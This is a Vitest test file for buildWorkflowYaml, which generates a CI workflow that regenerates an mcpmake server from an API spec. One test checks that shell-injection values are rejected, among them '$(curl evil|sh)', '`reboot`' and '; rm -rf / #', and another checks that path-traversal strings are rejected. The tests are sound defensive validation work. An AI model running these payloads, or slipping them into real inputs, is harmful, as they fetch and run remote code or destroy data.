import { describe, it, expect } from 'vitest';
import { buildWorkflowYaml } from '../../src/commands/ci.js';

describe('ci init: buildWorkflowYaml', () => {
  it('generates a sync workflow for OpenAPI + http + name', () => {
    const y = buildWorkflowYaml({
      spec: 'api/openapi.yaml',
      output: './server',
      source: 'openapi',
      transport: 'http',
      name: 'my-api',
      version: 'latest',
    });

    // Triggers: spec change (push + PR) and manual.
    expect(y).toContain('name: mcpmake');
    expect(y).toMatch(/on:\n {2}push:\n {4}paths:/);
    expect(y).toContain('  pull_request:');
    expect(y).toContain('  workflow_dispatch:');
    expect(y).toContain('- "api/openapi.yaml"');

    // Regeneration step with all flags.
    expect(y).toContain('npx --yes mcpmake@latest from openapi "api/openapi.yaml"');
    expect(y).toContain('-o "./server"');
    expect(y).toContain('-n "my-api"');
    expect(y).toContain('-t http');
    expect(y).toContain('-f');

    // Verify (OpenAPI) + drift gate.
    expect(y).toContain('verify "api/openapi.yaml" -p "./server"');
    expect(y).toContain('git status --porcelain "./server"');
    expect(y).toContain('exit 1');
  });

  it('omits the verify step and transport flag for non-openapi / stdio', () => {
    const y = buildWorkflowYaml({
      spec: 'recording.har',
      output: './s',
      source: 'har',
      transport: 'stdio',
      version: '0.1.0',
    });

    // Exact generate line proves no name flag and no -t http (stdio default).
    expect(y).toContain('run: npx --yes mcpmake@0.1.0 from har "recording.har" -o "./s" -f');
    expect(y).not.toContain('verify "'); // verify is OpenAPI-only
    // Drift gate still present for any source.
    expect(y).toContain('git status --porcelain "./s"');
  });

  it('rejects shell-injection payloads in inputs', () => {
    const base = {
      spec: 'api.yaml',
      output: './server',
      source: 'openapi' as const,
      transport: 'stdio' as const,
      version: 'latest',
    };
    expect(() => buildWorkflowYaml({ ...base, spec: '$(curl evil|sh)' })).toThrow(/Unsafe/);
    expect(() => buildWorkflowYaml({ ...base, output: '`reboot`' })).toThrow(/Unsafe/);
    expect(() => buildWorkflowYaml({ ...base, version: '; rm -rf / #' })).toThrow(/Unsafe/);
    expect(() => buildWorkflowYaml({ ...base, name: 'a"; evil; "' })).toThrow(/Unsafe/);
  });

  it('rejects path-traversal in the spec/output paths (`..` segment or absolute)', () => {
    const base = {
      spec: 'api.yaml',
      output: './server',
      source: 'openapi' as const,
      transport: 'stdio' as const,
      version: 'latest',
    };
    // The SAFE_PATH charset permits `.` and `/`, so a `..` traversal would slip
    // through without the explicit segment guard. Every escaping form throws.
    for (const bad of ['../../etc/x', '..', '../x', 'a/../b', 'a/..', './ok/../bad', '/etc/x']) {
      expect(() => buildWorkflowYaml({ ...base, spec: bad })).toThrow(/Unsafe/);
      expect(() => buildWorkflowYaml({ ...base, output: bad })).toThrow(/Unsafe/);
    }
    // Legit relative paths (incl. a filename that merely contains two dots) pass.
    for (const ok of ['api-spec.yaml', 'specs/api.yaml', './mcp-server', 'my..spec.yaml']) {
      expect(() => buildWorkflowYaml({ ...base, spec: ok, output: ok })).not.toThrow();
    }
  });
});
